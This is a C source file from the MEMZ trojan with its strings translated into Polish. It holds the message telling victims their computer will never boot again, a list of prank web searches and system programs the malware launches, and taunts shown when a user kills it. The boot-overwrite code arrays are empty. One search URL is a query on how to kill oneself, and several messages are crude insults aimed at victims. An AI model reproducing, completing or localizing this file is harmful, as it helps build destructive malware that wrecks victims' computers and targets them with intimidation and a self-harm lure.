#include "memz.h"

const unsigned char msg[] = "TWÓJ KOMPUTER ZOSTAŁ ZROBIONY PRZEZ TROJANA MEMZ.\r\n\r\nTwój komputer nie uruchomi się ponownie,\r\nwięc używaj go tak długo, jak możesz!\r\n\r\n:D\r\n\r\nPróba zabicia MEMZ spowoduje\r\nnatychmiastowe zniszczenie systemu, więc nie próbuj tego :D";

const char* sites[] = {
	"http://google.co.ck/search?q=najlepszy+sposób+na+zabicie+siebie",
	"http://google.co.ck/search?q=jak+2+usunąć+wirusa",
	"http://google.co.ck/search?q=mcafee+wporównaniuz+nortonem",
	"http://google.co.ck/search?q=jak+wysłać+wirusa+do+mojego+przyjaciela",
	"http://google.co.ck/search?q=minecraft+hax+pobierz+nie+wirus",
	"http://google.co.ck/search?q=jak+zdobyć+pieniądze",
	"http://google.co.ck/search?q=bonzi+buddy+pobierz+zadarmo",
	"http://google.co.ck/search?q=jak+2+kupić+zioło",
	"http://google.co.ck/search?q=jak+kodować+wirusa+w+wizualnym+podstawowym",
	"http://google.co.ck/search?q=co+się+stanie+jeśli+usuniesz+system32",
	"http://google.co.ck/search?q=dostawać+r3kt",
	"http://google.co.ck/search?q=partia+wirus+pobieranie",
	"http://google.co.ck/search?q=wirus.exe",
	"http://google.co.ck/search?q=internet+explorer+to+najlepsza+przeglądarka",
	"http://google.co.ck/search?q=facebook+hakowanie+narzędzie+bezpłatne+pobieranie+bez+wirusów+działających+2016",
	"http://google.co.ck/search?q=wirus+kreator+legalny+bezpłatny+pobierz",
	"http://google.co.ck/search?q=jak+utworzyć+własne+oprogramowanie+ransomware",
	"http://google.co.ck/search?q=jak+usunąć+memz+trojana+wirusa",
	"http://google.co.ck/search?q=mój+komputer+robi+dziwne+rzeczy+wtf+dziejesię+plz+halp",
	"http://google.co.ck/search?q=wilgotne+memz",
	"http://google.co.ck/search?q=jak+pobrać+memz",
	"http://google.co.ck/search?q=okrespółtrwania+3+wydanie+data",
	"http://google.co.ck/search?q=jest+iluminatów+rzeczywisty",
	"http://google.co.ck/search?q=montaż+parodia+tworzenie+program+2016",
	"http://google.co.ck/search?q=memz+są+prawdziwe",
	"http://google.co.ck/search?q=śmierdzący+danky+maymays",
	"http://google.co.ck/search?q=john+cena+midi+legalne+nie+konwertowane",
	"http://google.co.ck/search?q=soswinny+mem+kolekcja",
	"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
	"http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
	"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
	"http://play.clubpenguin.com",
	"http://pcoptimizerpro.com",
	"http://softonic.com",
	"calc",
	"notepad",
	"cmd",
	"write",
	"regedit",
	"explorer",
	"taskmgr",
	"msconfig",
	"mspaint",
	"devmgmt.msc",
	"control",
	"mmc",
};

const size_t nSites = sizeof(sites) / sizeof(void*);

const char* msgs[] = {
	"ZABIŁEŚ MÓJ TROJAN!\r\nTeraz umrzesz.",
	"ODPOCZYWAJ W SIKACH, NA ZAWSZE PANNO.",
	"OSTRZEGAŁEM CIĘ...",
	"HAHA N00B L2P G3T R3KT",
	"Nie udało Ci się osiągnąć umiejętności 1337 h4x0r.",
	"PRÓBOWAŁEŚ TAK CIĘŻKO I DOSZEDŁEŚ TAK DALEKO, ALE W KOŃCU TWÓJ KOMPUTER NADAL BYŁ ZJEBONY!",
	"HACKER!\r\nKORZYSTAJ Z BANA!",
	"NASTĘPNYM RAZEM BĘDĘ LEPSZY xD",
	"Miłej zabawy przy próbie przywrócenia danych :D",
	"|\\/|3|\\/|2",
	"NADCHODZI BSOD",
	"PRANK WIRUSOWY (BŁĄD)",
	"CIESZ SIĘ KOTEM NYAN",
	"Zdobądź wilgotny program antywirusowy m9!",
	"Jesteś idiotą!\r\nHA HA HA HA HA HA HA",
	"#MakeMalwareGreatAgain",
	"KTOŚ MI RÓWNIEŻ POWIEDZIAŁ, ŻE MEMZ MNIE PRZEWRÓCI",
	"Dlaczego w ogóle próbowałeś zabić MEMZ?\r\nTwój komputer i tak jest popsuty.",
	"SecureBoot jest do bani.",
	"gr8 m8 i r8 8/8",
	"Próbowałeś wyłączyć i włączyć ponownie?",
	"<Wstaw tutaj cytat Joela>",
	"Pozdrowienia dla wszystkich członków GAiA!",
	"Witam. Nie sądzę, że zostaliśmy właściwie przedstawieni. Jestem Bonzi!",
	"„To wszystko, czego chcę na moim komputerze”\r\n – danooct1 2016",
	"Ach, Club Penguin. Czas zostać zbanowanym!”\r\n – danooct1 2016",
};

const size_t nMsgs = sizeof(msgs) / sizeof(void*);

const char* sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

const size_t nSounds = sizeof(sounds) / sizeof(void*);

// Split into 2 parts to save some space.

const unsigned char code1[] = {
	
};

const unsigned char code2[] = {
	
};

const size_t code1_len = sizeof(code1);
const size_t code2_len = sizeof(code2);
const size_t msg_len = sizeof(msg);